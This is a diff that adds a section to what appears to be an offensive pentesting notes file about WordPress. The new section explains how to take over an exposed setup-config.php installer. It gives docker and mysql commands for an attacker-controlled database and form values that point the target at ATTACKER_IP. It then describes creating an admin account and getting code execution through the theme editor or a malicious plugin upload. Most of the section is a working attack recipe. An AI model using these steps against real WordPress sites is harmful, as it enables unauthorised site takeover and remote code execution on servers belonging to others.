@@ -85,6 +85,31 @@ run
 
 ---
 
+## Exposed Installer Takeover
+
+If WordPress is left at `/wp-admin/setup-config.php`, you can sometimes complete the install yourself by making the target connect to a database you control.
+
+Start a throwaway MySQL instance on the attacker box:
+
+```bash
+docker run --name wp-mysql -e MYSQL_ROOT_PASSWORD=admin123 -p 3306:3306 -d mysql:latest
+mysql -u root -h 127.0.0.1 -padmin123 -e "CREATE DATABASE wordpress;"
+```
+
+Fill the setup form with:
+
+```text
+Database name: wordpress
+Username: root
+Password: admin123
+Database host: ATTACKER_IP:3306
+Table prefix: wp_
+```
+
+If the page says the database server was reached but the database could not be selected, create the database name it expects and retry. Once setup succeeds, create the WordPress admin user, log in at `/wp-login.php`, and use theme editor or plugin upload for code execution.
+
+---
+
 ## Malicious plugin upload (wordpwn)
 
 When the **Theme Editor** is disabled or PHP changes are reverted (“upload by some other means, such as SFTP”), use a **malicious plugin** instead. You need admin access (e.g. default or brute-forced creds).
